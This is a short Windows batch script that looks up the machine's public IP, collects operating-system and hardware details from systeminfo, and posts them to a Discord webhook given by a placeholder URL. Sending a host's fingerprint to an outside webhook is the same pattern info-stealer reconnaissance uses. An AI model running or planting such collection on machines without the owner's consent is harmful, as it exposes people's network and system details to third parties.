@echo off
setlocal enabledelayedexpansion

set WEBHOOK_URL="YOUR_WEBHOOK_URL"

:: Get the public IPv4 address
for /f "tokens=*" %%a in ('curl -4 -s https://ifconfig.me') do set PUBLIC_IP=%%a

:: Initialize variable to store system info
set INFO=**Public IP:** !PUBLIC_IP!^

:: Capture relevant information with new lines and bold labels
for /f "tokens=1,* delims=:" %%a in ('systeminfo ^| findstr /i /c:"OS " /c:"System " /c:"Total Physical Memory" /c:"Available Physical Memory" /c:"Virtual Memory" /c:"Manufacturer" /c:"Model" /c:"Locale" /c:"Boot Time"') do (
    set KEY=%%a
    set VALUE=%%b
    set KEY=!KEY: =!
    set VALUE=!VALUE: =!
    set INFO=!INFO!^
**!KEY!:** !VALUE!^


)

:: If INFO is still empty, add a fallback message
if "!INFO!"=="" (
    set INFO=System info could not be retrieved.
)

:: Send the captured system info and public IP to Discord webhook
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "content=!INFO!" %WEBHOOK_URL%

echo Script completed.
pause
